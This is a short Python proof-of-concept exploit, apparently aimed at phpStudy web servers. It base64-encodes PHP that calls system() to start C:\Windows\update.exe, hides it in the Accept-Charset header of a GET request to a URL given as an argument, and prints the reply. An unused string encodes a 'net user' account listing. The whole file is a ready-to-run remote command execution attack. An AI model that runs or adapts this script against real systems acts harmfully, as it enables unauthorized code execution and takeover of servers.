# -*-coding:utf-8 -*-

import requests
import sys
import base64

def Poc(ip):
    payload = "echo system('start C:\\Windows\\update.exe');"
    poc = "ZWNobyBzeXN0ZW0oIm5ldCB1c2VyIik7"
    pay = base64.b64encode(payload.encode('utf-8'))
    #poc = str(pay,"utf-8")
    headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
    "Connection": "close",
    "Accept-Encoding": "gzip,deflate",
    "Accept-Charset": pay,
    "Upgrade-Insecure-Requests": "1",
    }
    url = ip
    r = requests.get(url,headers=headers)
    print(r.text)

if len(sys.argv) < 2:
    print("python phpstudy.py http://127.0.0.1")
else:
    Poc(sys.argv[1])